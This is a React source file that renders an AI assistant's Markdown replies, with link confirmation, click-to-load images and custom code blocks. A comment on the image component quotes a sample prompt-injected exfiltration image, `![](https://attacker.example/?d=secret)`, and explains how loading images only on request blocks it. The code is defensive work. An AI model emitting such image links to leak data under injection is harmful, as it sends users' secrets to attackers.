import { type MouseEvent, type ReactNode, use, useState } from 'react'
import {
  type AnimateOptions,
  type Components,
  type ExtraProps,
  type PluginConfig,
  Streamdown,
  useIsCodeFenceIncomplete,
} from 'streamdown'
import remarkGfm from 'remark-gfm'
import { useMediaQuery } from '@goblin/ui'
import { ImageIcon } from 'lucide-react'
import { blockKind } from '../../lib/fences.ts'
import { REPLY_HTML, replyUrl } from '../../lib/reply-html.ts'
import { RichBlock } from './blocks.tsx'
import { CodeBlock } from './code-block.tsx'
import { LinkConfirm } from './link-confirm.tsx'
import { mayHoldMath, useMath } from './math.ts'
import { ReplyTable } from './reply-table.tsx'

/** Streamdown's renderers for prose, each replaced by its plain element: shadcn/typeset sets the text. */
const PROSE = {
  a: 'a',
  blockquote: 'blockquote',
  h1: 'h1',
  h2: 'h2',
  h3: 'h3',
  h4: 'h4',
  h5: 'h5',
  h6: 'h6',
  hr: 'hr',
  img: 'img',
  li: 'li',
  ol: 'ol',
  p: 'p',
  section: 'section',
  strong: 'strong',
  sub: 'sub',
  sup: 'sup',
  table: 'table',
  tbody: 'tbody',
  td: 'td',
  th: 'th',
  thead: 'thead',
  tr: 'tr',
  ul: 'ul',
} as const satisfies Components

/**
 * Every Streamdown renderer replaced by its plain element, code included: tool output is set by typeset alone, without
 * Streamdown's classes, buttons and wrappers. `test/markdown-render.test.ts` checks that this names every one of them.
 */
export const PLAIN = { ...PROSE, code: 'code', pre: 'pre' } as const satisfies Components

/** Wide tables scroll sideways instead of widening the conversation. */
export const Table = ({ children }: { readonly children?: ReactNode } & ExtraProps) => (
  <div className="typeset-scroll">
    <table>{children}</table>
  </div>
)

type CodeProps = { readonly className?: string | undefined; readonly children?: ReactNode } & ExtraProps
const LANGUAGE = /(?:^|\s)language-(\S+)/u

/**
 * Code in a reply. Inline, it is typeset's. A block (Streamdown's `pre` marks it `data-block`) is a figure when its
 * language is ```mermaid, ```chart or ```map and its fence is whole, and a `CodeBlock` otherwise. While a reply
 * streams, the block still being written stays code: Streamdown says which one that is. A figure's fallback is marked
 * `data-figure`, so which code becomes a figure shows (and is tested) before hydration.
 */
function Code({ className, children, ...props }: CodeProps) {
  const incomplete = useIsCodeFenceIncomplete()
  if (!('data-block' in props)) return <code>{children}</code>
  const language = LANGUAGE.exec(className ?? '')?.[1] ?? ''
  const source = typeof children === 'string' ? children : ''
  const kind = blockKind(className)
  if (kind === undefined || incomplete) return <CodeBlock code={source} language={language} live={incomplete} />
  const fallback = (
    <pre data-figure={kind}>
      <code className={className}>{source}</code>
    </pre>
  )
  return <RichBlock kind={kind} source={source} code={fallback} />
}

/**
 * A link in a reply: a real link (its address shows on hover and copies), which in the shell asks before it opens
 * (`LinkConfirm`), on a click or a middle click alike. It opens in a new tab without a referrer.
 */
function ChatLink({
  href,
  id,
  children,
}: {
  readonly href?: string | undefined
  readonly id?: string | undefined
  readonly children?: ReactNode
} & ExtraProps) {
  const ask = use(LinkConfirm)
  if (href === undefined) return <span>{children}</span>
  // A footnote and its way back stay in the reply.
  if (href.startsWith('#'))
    return (
      <a href={href} id={id}>
        {children}
      </a>
    )
  const confirm =
    ask === undefined
      ? undefined
      : (event: MouseEvent) => {
          if (event.button > 1) return
          event.preventDefault()
          ask(href)
        }
  return (
    <a href={href} target="_blank" rel="noreferrer noopener" onClick={confirm} onAuxClick={confirm}>
      {children}
    </a>
  )
}

/**
 * An image in a reply: named, with where it is from, and fetched only when the owner asks. A reply cannot make the
 * browser call an address by itself, so a prompt-injected `![](https://attacker.example/?d=secret)` carries nothing
 * out. Once asked, it loads without a referrer; anything but a web address stays a name.
 */
function ChatImage({
  src,
  alt,
}: { readonly src?: string | undefined; readonly alt?: string | undefined } & ExtraProps) {
  const [shown, setShown] = useState(false)
  const url = src === undefined ? null : URL.parse(src)
  const name = alt === undefined || alt === '' ? 'Image' : alt
  if (url === null || (url.protocol !== 'https:' && url.protocol !== 'http:'))
    return (
      <span className="inline-flex items-center gap-1 text-muted-foreground">
        <ImageIcon aria-hidden className="size-3.5" />
        {name}
      </span>
    )
  if (shown) return <img src={url.href} alt={alt ?? ''} referrerPolicy="no-referrer" loading="lazy" decoding="async" />
  return (
    <button
      type="button"
      className="inline-flex items-center gap-1.5 rounded-md border px-2 py-0.5 text-sm text-muted-foreground hover:bg-muted"
      title={url.href}
      aria-label={`Load image ${name} from ${url.host}`}
      onClick={() => setShown(true)}
    >
      <ImageIcon aria-hidden className="size-3.5" />
      {name}
      <span className="text-xs">{url.host}</span>
    </button>
  )
}

/** Prose as typeset sets it, Goblin's own code blocks, tables and figures, and the reply's links and images. */
const CHAT: Components = { ...PROSE, a: ChatLink, img: ChatImage, table: ReplyTable, code: Code }

/** The words of a reply still streaming fade in, briefly; with less motion asked for, they just appear. */
const FADE_IN: AnimateOptions = { animation: 'fadeIn', duration: 150, sep: 'word' }
const NO_PLUGINS: PluginConfig = {}
let withMath: PluginConfig | undefined
/** The plugins once math has loaded, made once so every message gets the same object and its blocks stay memoised. */
const mathPlugins = (math: PluginConfig['math']): PluginConfig =>
  math === undefined ? NO_PLUGINS : (withMath ??= { math })
export const REMARK = [remarkGfm]
/** No rehype plugins, for tool output: Streamdown's defaults would render raw HTML (`rehype-raw`). */
export const NO_REHYPE: [] = []

/**
 * Assistant Markdown, set by shadcn/typeset, with the little HTML a reply may use (`REPLY_HTML`). Always in Streamdown's streaming mode, so a
 * reply's blocks stay mounted when it settles (a table scrolled sideways keeps its place): `live` only says whether
 * the last block may still be unfinished, and lets Streamdown close what the model has not closed yet (`**bold`).
 * Streamdown parses the text into blocks and renders each on its own, so a streamed batch renders the block being
 * written again, not the whole reply.
 */
export function ChatMarkdown({ text, live }: { readonly text: string; readonly live: boolean }) {
  const math = useMath(mayHoldMath(text))
  const still = useMediaQuery('(prefers-reduced-motion: reduce)')
  return (
    <div className="typeset typeset-chat" data-live={live ? '' : undefined}>
      <Streamdown
        mode="streaming"
        isAnimating={live}
        parseIncompleteMarkdown={live}
        remarkPlugins={REMARK}
        rehypePlugins={REPLY_HTML}
        urlTransform={replyUrl}
        components={CHAT}
        plugins={mathPlugins(math)}
        animated={still ? false : FADE_IN}
        controls={false}
      >
        {text}
      </Streamdown>
    </div>
  )
}
